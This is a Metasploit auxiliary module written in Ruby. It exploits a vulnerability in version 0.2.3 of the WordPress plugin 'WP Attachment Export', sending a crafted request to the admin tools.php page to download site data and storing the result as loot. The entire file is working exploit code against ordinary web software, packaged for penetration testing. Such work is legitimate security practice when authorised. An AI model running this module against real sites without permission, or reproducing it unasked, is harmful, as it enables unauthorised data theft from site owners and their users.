##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Attachment Export File Download Vulnerability',
      'Description'    => %q{
        This module exploits a vulnerability in WordPress Plugin "WP Attachment Export"
        version 0.2.3, allowing to download arbitrary files with the web server privileges.
      },
      'References'     =>
        [
          ['WPVDB', '8103'],
          ['URL', 'https://packetstormsecurity.com/files/132693/']
        ],
      'Author'         =>
        [
          'Nitin Venkatesh', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', 'wp-attachment-export-download']),
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('wp-attachment-export', '0.2.4')
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_backend, 'tools.php'),
      'vars_get' =>
        {
          'content' => "",
          "#{filename}" => 'true'
        }
    })

    if res && res.code == 200 && res.body.length > 0

      print_status('Downloading file...')
      vprint_line("\n#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'attachment-export.download',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try again.")
    end
  end
end
